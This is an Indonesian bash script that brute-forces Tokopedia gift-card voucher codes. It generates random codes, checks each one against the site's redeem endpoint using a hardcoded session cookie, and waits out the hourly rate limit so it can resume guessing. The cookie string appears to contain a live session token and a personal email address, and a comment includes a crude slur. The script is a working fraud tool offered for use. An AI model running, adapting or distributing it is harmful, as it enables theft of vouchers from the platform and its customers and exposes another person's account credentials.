#Coded By AchonkJust - Extreme Crew
#issued 07-Mar-2018
#ToloPedia Extrap auto redeem voucher
#Update!!
#!/bin/bash/sh
putih='\033[0m'
ijo='\e[38;5;82m'
merah='\e[38;5;196m'
 header(){
printf "${ijo}"
printf "     ___        __                _____ _____ _____   _       ________    \n"
printf "    /   | _____/ /_  ____  ____  / ___// ___// ___/  (_)_  __/ ____/ /_   \n"
printf "   / /| |/ ___/ __ \/ __ \/ __ \/ __ \/ __ \/ __ \  / / / / /___ \/ __/   \n"
printf "  / ___ / /__/ / / / /_/ / / / / /_/ / /_/ / /_/ / / / /_/ /___/ / /_     \n"
printf " /_/  |_\___/_/ /_/\____/_/ /_/\____/\____/\____/_/ /\__,_/_____/\__/     \n"
printf "==========ToloPedia Extrap Voucher=============/___/ By Extreme.Crew 	  \n"
}
clear
header
echo "1 Akun Max 10 kali generate"
#Edit Your Cookies Here
ngelog(){
cok="_gorilla_csrf=MTUzOTY5NzgwNXxJalJWVERGRmRXeG1RVU5HVWs1NlFtOXVSbGRLUmpSYWNqUTJkRVV2V1hsWFltRkVhSFp6WVdSVGFEZzlJZ289fErVVJhnZMzKahJBGzJ_MB5l2U7-t5yyncgU2jFoI1BU; _SID_Tokopedia_=sB7-LTqC005OfnsIsJTHFGNbuJsqwuJpkWIAQtPNfCPuO_pyo8dywSqZAnoMPdUyLBguMW3LCIGPCkJDkMzLx3flVhnayu14lDwG8x5VJ2q_ggIjk41Zfyc11HmDkz1l; _ID_autocomplete_=ef0aa053c2304916a3f94daa07ac23fd; _gcl_au=1.1.1692107313.1539672681; __auc=4045dbe71667ba4aaafaf5f172d; _BID_TOKOPEDIA_=3889cedbad927633dbc59f3c3e6ac5c5; insdrSV=22; scs=%7B%22t%22%3A1%7D; _ga=GA1.2.669863426.1539672686; _gid=GA1.2.200463248.1539672686; cto_lwid=388eea9e-d835-4c7f-b59d-6578332eb5c1; insUserData=%7B%22email%22%3A%22rizalo.iid%40gmail.com%22%7D; pulsa-aff=undefined; zarget_visitor_info=%7B%7D; _ga=GA1.3.669863426.1539672686; _gid=GA1.3.200463248.1539672686; shipping_notif=0; __sonar=8902025497422915388; l=1; fe_discovery_experiments=%7B%226416418%22%3A%7B%22exp_middle_row_ads%22%3A%7B%22name%22%3A%22exp_middle_row_ads%22%2C%22selected%22%3A%22topads-current%22%7D%7D%7D; vn_is=1; __asc=454b1faa1667d20493ac5c585ad; ins-gaSSId=aaddadea-c3b6-b6bf-983a-a1db6d6716f8_1539701167; USER_DATA=%7B%22attributes%22%3A%5B%5D%2C%22subscribedToOldSdk%22%3Afalse%2C%22deviceUuid%22%3A%22ebcfaa58-3051-4ee0-95a7-5d2abb705266%22%2C%22deviceAdded%22%3Afalse%7D; lang=id"
#ganti cok nya doang kontol
	curl -s -X GET \
--url "https://pulsa.tokopedia.com/gift-card/tokopedia/redeem/check?voucher_code=$1" \
-H "accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
-H "accept-encoding: gzip, deflate, br" \
-H "cookie: $cok" \
-H "accept-language: en-US,en;q=0.9" \
-H "cache-control: max-age=0" \
-H "upgrade-insecure-requests: 1" \
-H "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
}

for generate in $(cat /dev/urandom | tr -dc 'A-Z0-9' | fold -w 13 | head -n 10); do
	base="FPL$generate"
	ok=$(ngelog $base | grep -Po "(?<=\"message\":\").*?(?=\"\,\")")
	echo "$base [ $ok ]"
	if [[ "$ok" =~ 'Anda telah mencoba lebih dari 10x' ]]; then
	secs=$((60 * 60))
		while [ $secs -gt 0 ]; do
   	echo -ne "Menunggu selama : $secs Untuk Auto Run :)\033[0K\r"
   	sleep 1
   	: $((secs--))
	done
	fi
done
